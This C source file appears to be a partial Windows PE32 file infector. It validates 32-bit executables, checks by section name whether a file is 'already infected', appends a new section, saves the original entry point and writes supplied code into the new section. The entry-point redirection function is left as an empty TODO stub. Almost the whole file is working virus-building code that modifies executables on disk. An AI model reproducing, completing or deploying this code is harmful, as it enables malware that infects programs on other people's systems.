#include <windows.h>
#include <stdio.h>
#include "p32_infect.h"

DWORD   p32_isValidPe32(PIMAGE_DOS_HEADER pDos,PIMAGE_NT_HEADERS32 pNt) {
	
	    if(( pDos->e_magic != IMAGE_DOS_SIGNATURE ) || 
	       ( pNt->Signature != 0x4550) ) return (DWORD)P32_INVALIDPE_ERROR;
		   
		if(pNt->OptionalHeader.Magic != 0x10B) return (DWORD)P32_ISX64_FILE_ERROR;  /* chck: ! (fix) */
	    
	    return (DWORD)P32_NO_ERROR;
	    
}

PIMAGE_SECTION_HEADER p32_isAlreadyInfected(CONST CHAR* CONST sName,PIMAGE_SECTION_HEADER pSec,CONST UWORD secCnt) {
	
	                  UWORD i;
	                  PIMAGE_SECTION_HEADER ret = pSec;
	                  
	                  for(i=0;i<secCnt;i++) {
	                  	
	                  	  if(!lstrcmp((LPCSTR)ret->Name,(LPCSTR)sName)) return NULL;
	                  	  ++ret;
					  }
	                  
	                  return ret;
	
}

DWORD   p32_addNewSection(PP32_HNDS p32Hnds,CONST CHAR* CONST sName,DWORD sCharacterics,UINT sSize) {
	
	    DWORD lSize,hSize;		  
		
		lSize = GetFileSize(p32Hnds->hFile,&hSize);	
		if((lSize == 0) || (lSize == INVALID_FILE_SIZE)) return (DWORD)P32_BADFILESIZE_ERROR;
		else {
			  UINT tSize;
			  HANDLE hProcHeap;
			  
			  unsigned long long tmpSize = (unsigned long long)llabs(lSize + hSize);
			  if(tmpSize < lSize + hSize) return (DWORD)P32_INTOVERFLOW_ERROR; /* to jest w sumie nadmiarowe DWORD+DWORD jest zawsze mniejszy niz ulong ulong */
			  tmpSize += sSize;
			  tSize    = (UINT)tmpSize;
			  if(tSize < tmpSize) return (DWORD)P32_INTOVERFLOW_ERROR;             /* ??!??!! */
			 
			  hProcHeap = GetProcessHeap();
			  if(hProcHeap == NULL) return (DWORD)P32_GETHEAP_ERROR;
			  else {
			  	    UCHAR* fileBuff = (UCHAR*)HeapAlloc(hProcHeap,HEAP_ZERO_MEMORY,tSize);
			  	    if(fileBuff == NULL) return (DWORD)P32_HEAPALLOC_ERROR;
			  	    else {
			  	    	  if(!ReadFile(p32Hnds->hFile,fileBuff,tSize - sSize,NULL,NULL)) return (DWORD)P32_READFILE_ERROR;
			  	    	  else {
			  	    	  	    DWORD falidPe;
			  	    	  	    PIMAGE_DOS_HEADER   pDos  = (PIMAGE_DOS_HEADER)fileBuff;
			  	    	  	    PIMAGE_NT_HEADERS32 pNt   = (PIMAGE_NT_HEADERS32)(fileBuff + pDos->e_lfanew);
			  	    	  	    
			  	    	  	    if( (falidPe = p32_isValidPe32(pDos,pNt)) != P32_NO_ERROR) return falidPe;
			  	    	  	    else  {
			  	    	  	    	   WORD secCnt                = pNt->FileHeader.NumberOfSections;
			  	    	  	    	   PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)(fileBuff + pDos->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
		
			  	    	  	    	   if( (pSec = p32_isAlreadyInfected(sName,pSec,secCnt)) == NULL) return (DWORD)P32_ALREADY_INFECT_ERROR;
			  	    	  	    	   else {
			  	    	  	    	         
										     memset(pSec,0x00,sizeof(IMAGE_SECTION_HEADER));
											 strncpy((char*)pSec->Name,sName,strlen(sName));	
											 
											 pSec->Misc.VirtualSize = P32_ALIGN(sSize,pNt->OptionalHeader.SectionAlignment,0);
											 pSec->VirtualAddress   = P32_ALIGN((pSec- 1)->Misc.VirtualSize,pNt->OptionalHeader.SectionAlignment,(pSec - 1)->VirtualAddress);
											 pSec->SizeOfRawData    = P32_ALIGN(sSize,pNt->OptionalHeader.FileAlignment,0);
											 pSec->PointerToRawData = P32_ALIGN((pSec - 1)->SizeOfRawData,pNt->OptionalHeader.FileAlignment,(pSec - 1)->PointerToRawData);
											 
											 pSec->Characteristics  = sCharacterics;
											 
											 p32Hnds->nSection = pSec;
											 
											 p32Hnds->oEp = pNt->OptionalHeader.AddressOfEntryPoint;
											 p32Hnds->ep  = pSec->PointerToRawData;
											 
											 SetFilePointer(p32Hnds->hFile,pSec->PointerToRawData + pSec->SizeOfRawData,NULL,FILE_BEGIN);
							   	  	         SetEndOfFile(p32Hnds->hFile);
											 
											 pNt->OptionalHeader.SizeOfImage   = (pSec->VirtualAddress + pSec->Misc.VirtualSize);
							   	  	      	 pNt->FileHeader.NumberOfSections += 1;
							   	  	      	 
							   	  	      	 SetFilePointer(p32Hnds->hFile, 0, NULL, FILE_BEGIN);
							   	  	      	 
							   	  	      	 if(!WriteFile(p32Hnds->hFile,fileBuff,tSize,NULL,NULL)) {
											    return (DWORD)P32_WRITEFILE_ERROR; 
										     }
											 
									   }
								}
					      }
			  	    	  HeapFree(hProcHeap,0,fileBuff);
				    }  
			  }
		}
				  					  
		return (DWORD)P32_NO_ERROR;
}

BOOL    p32_insertCode(HANDLE hFile,PIMAGE_SECTION_HEADER nSec,const CHAR* code,UINT cSize) {
	
	    BOOL ret;
	    SetFilePointer(hFile,nSec->PointerToRawData,NULL,FILE_BEGIN);
	    ret = WriteFile(hFile,code,cSize,0,0);
	    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
	    return ret;
}

VOID    p32_setEntryPoint(HANDLE hFile,DWORD oEp,DWORD nEp) {
	    /* TODO ... cdn ... tbc */
}
